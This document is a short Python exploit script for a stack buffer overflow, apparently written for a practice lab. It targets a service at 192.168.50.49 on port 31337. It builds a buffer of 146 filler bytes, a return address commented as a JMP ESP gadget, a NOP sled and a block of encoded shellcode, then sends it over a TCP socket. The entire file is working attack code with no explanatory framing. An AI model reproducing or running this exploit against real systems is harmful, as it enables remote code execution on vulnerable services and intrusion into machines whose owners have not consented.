#!usr/bin/python3

import socket,sys
#import sys

#080414c3 jmp location
#080414C3 08 04 14 C3
# 08 04 14 C3   ? FFE4           JMP ESP



ip = '192.168.50.49'
port = 31337


#offset = 146 
# 080414C3

offset = 'A'*146 
retn = '\xc3\x14\x04\x08'
padding = '\x90'*8
payload = (
"\xbf\x36\xd9\xe7\x0f\xd9\xd0\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x52\x83\xee\xfc\x31\x7e\x0e\x03\x48\xd7\x05\xfa\x48"
"\x0f\x4b\x05\xb0\xd0\x2c\x8f\x55\xe1\x6c\xeb\x1e\x52\x5d"
"\x7f\x72\x5f\x16\x2d\x66\xd4\x5a\xfa\x89\x5d\xd0\xdc\xa4"
"\x5e\x49\x1c\xa7\xdc\x90\x71\x07\xdc\x5a\x84\x46\x19\x86"
"\x65\x1a\xf2\xcc\xd8\x8a\x77\x98\xe0\x21\xcb\x0c\x61\xd6"
"\x9c\x2f\x40\x49\x96\x69\x42\x68\x7b\x02\xcb\x72\x98\x2f"
"\x85\x09\x6a\xdb\x14\xdb\xa2\x24\xba\x22\x0b\xd7\xc2\x63"
"\xac\x08\xb1\x9d\xce\xb5\xc2\x5a\xac\x61\x46\x78\x16\xe1"
"\xf0\xa4\xa6\x26\x66\x2f\xa4\x83\xec\x77\xa9\x12\x20\x0c"
"\xd5\x9f\xc7\xc2\x5f\xdb\xe3\xc6\x04\xbf\x8a\x5f\xe1\x6e"
"\xb2\xbf\x4a\xce\x16\xb4\x67\x1b\x2b\x97\xef\xe8\x06\x27"
"\xf0\x66\x10\x54\xc2\x29\x8a\xf2\x6e\xa1\x14\x05\x90\x98"
"\xe1\x99\x6f\x23\x12\xb0\xab\x77\x42\xaa\x1a\xf8\x09\x2a"
"\xa2\x2d\x9d\x7a\x0c\x9e\x5e\x2a\xec\x4e\x37\x20\xe3\xb1"
"\x27\x4b\x29\xda\xc2\xb6\xba\x25\xba\x8a\xca\xce\xb9\xea"
"\x3b\x53\x37\x0c\x51\x7b\x11\x87\xce\xe2\x38\x53\x6e\xea"
"\x96\x1e\xb0\x60\x15\xdf\x7f\x81\x50\xf3\xe8\x61\x2f\xa9"
"\xbf\x7e\x85\xc5\x5c\xec\x42\x15\x2a\x0d\xdd\x42\x7b\xe3"
"\x14\x06\x91\x5a\x8f\x34\x68\x3a\xe8\xfc\xb7\xff\xf7\xfd"
"\x3a\xbb\xd3\xed\x82\x44\x58\x59\x5b\x13\x36\x37\x1d\xcd"
"\xf8\xe1\xf7\xa2\x52\x65\x81\x88\x64\xf3\x8e\xc4\x12\x1b"
"\x3e\xb1\x62\x24\x8f\x55\x63\x5d\xed\xc5\x8c\xb4\xb5\xe6"
"\x6e\x1c\xc0\x8e\x36\xf5\x69\xd3\xc8\x20\xad\xea\x4a\xc0"
"\x4e\x09\x52\xa1\x4b\x55\xd4\x5a\x26\xc6\xb1\x5c\x95\xe7"
"\x93"
) 

buffer = offset  + retn + padding +  payload 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip,port))
    print('Sending bytes....')
    r = s.send(bytes(buffer + "\r\n", "latin-1"))
    s.recv(1024)
    print('Done')
except:
    print('Cant connect moron')
    sys.exit()
